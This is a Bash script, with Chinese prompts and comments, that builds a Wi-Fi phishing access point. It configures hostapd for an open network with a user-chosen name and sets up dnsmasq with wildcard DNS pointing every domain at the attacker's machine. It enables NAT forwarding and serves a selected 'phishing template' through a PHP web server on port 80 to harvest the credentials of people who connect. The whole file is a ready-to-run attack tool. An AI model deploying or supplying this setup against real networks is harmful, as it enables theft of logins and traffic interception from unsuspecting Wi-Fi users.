#!/bin/bash

hasInstalled(){
	echo "[*] 检查是否安装了 $1 "
	if [ ! "$(command -v $1)" ]; then
	  echo "[!] $1 没有安装，请运行 apt install $1 进行安装" >&2
		exit 1
		else
		echo "[+] $1 已安装" >&2
	fi
}

runCmd(){
	echo ""
	echo "┍-------------------- $ $1 --------------------┑"
	flag=1
	nohup $1 >> $2 2>&1 &
	if [ $? == 0 ];then
	  echo "[+] $ $1 执行成功"
	  else
	  echo "[-] $ $1 执行失败"
		$flag=0
	fi
	if [ $flag == 0 ];then
		exit 1
	fi
	echo "┕-------------------- $ $1 --------------------┙"
	echo ""
}


writeFile(){
cat>$2<<EOF
$1
EOF
echo "[+] 写入 $2 成功"
}

hasInterface(){
	if ifconfig|grep $1>/dev/null;then
		echo "[+] $1 网卡存在"
		else
		echo "[-] $1 网卡不存在"
		exit 1
	fi
}


hasInstalled "hostapd"
hasInstalled "dnsmasq"

echo "[!] 准备关闭wpa_supplicant和NetworkManager(防止AP信道被修改导致错误)"
systemctl stop NetworkManager
systemctl stop wpa_supplicant


echo ""
echo "[!] 准备创建钓鱼用的hostapd.conf"


echo -n "[!] 请输入可以上网的网卡（例如eth0）: "
read eth_interface
hasInterface $eth_interface

echo -n "[!] 请输入创建钓鱼AP的网卡（不用开启monitor模式）: "
read wlan
hasInterface $wlan

echo -n "[!] 请输入创建钓鱼AP的ESSID（也就是WIFI名称）: "
read essid

hostapd_conf="
# hostapd.conf
# 用来创建AP的网卡
interface=$wlan
# 你即将创建的WIFI名称
ssid=$essid
# 工作在802.11G模式
hw_mode=g
# 信道
channel=6
# mac地址访问控制列表
macaddr_acl=0
# 1表示开放系统验证，2表示预共享密钥认证，３表示都支持
auth_algs=1
ignore_broadcast_ssid=0
ieee80211n=1
wme_enabled=1
driver=nl80211
"


writeFile "$hostapd_conf" "hostapd.conf"


dnsmasq_conf="
interface=$wlan
# DHCP给客户端分配IP的范围：10.0.221.2~10.0.221.150，掩码：255.255.255.0
dhcp-range=10.0.221.2,10.0.221.150,255.255.255.0,12h
# router网关
dhcp-option=3,10.0.221.1
# dns-server网关
dhcp-option=6,10.0.221.1
# 指定默认查询的上游服务器
server=8.8.8.8
server=114.114.114.114
# 记录dns查询日志
log-queries
log-dhcp
# 定义dnsmasq监听的地址，默认是监控本机的所有网卡上
listen-address=10.0.221.1
# 启用泛域名解析，这里就是所有的域名解析都指向10.0.221.1
address=/#/10.0.221.1
"

writeFile "$dnsmasq_conf" "dnsmasq.conf"


echo "[!] 准备配置路由表和路由转发"
# 给wlan网卡分配IP地址和子网掩码
ifconfig $wlan 10.0.221.1 netmask 255.255.255.0
# 添加路由
route add -net 10.0.221.0 netmask 255.255.255.0 gw 10.0.221.1

iptables -t nat -A POSTROUTING -o $eth_interface -j MASQUERADE
iptables -A FORWARD -i $eth_interface -o $wlan -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i $wlan -o $eth_interface -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward


printf "
┍---------------------------------------- 路由相关配置信息 ----------------------------------------┑

[*] 路由表:
`netstat -nr`

[*] iptables NAT链:
`iptables -L -n --line-number -t nat`

[*] iptables规则:
`iptables -L -n --line-number`

[*] 如果想删除脚本添加的路由表，可以执行如下命令:
route del -net 10.0.221.0 netmask 255.255.255.0

[*] 如果想删除添加的iptables规则，可以执行如下命令:
iptables -D  POSTROUTING -o eth0 -j MASQUERADE -t nat
iptables -D FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -D FORWARD -i wlan0 -o eth0 -j ACCEPT

┕---------------------------------------- 路由相关配置信息 ----------------------------------------┙
"
echo ""

echo -n "[!] 请输入钓鱼模版: "
read temp

# 启动WEB服务，别用那种有漏洞模版，等下别被人日了
echo "[*] WEB服务目录: ./templates/$temp"
runCmd "php -S 10.0.221.1:80 -t ./templates/$temp" "web_log.txt"

# 启动DHCP
# dnsmasq -C dnsmasq.conf -d
runCmd "dnsmasq -C dnsmasq.conf -d" "dnsmasq_log.txt"

# 启动钓鱼AP
runCmd "hostapd hostapd.conf" "hostapd_log.txt"

echo "[+] 钓鱼AP启动成功"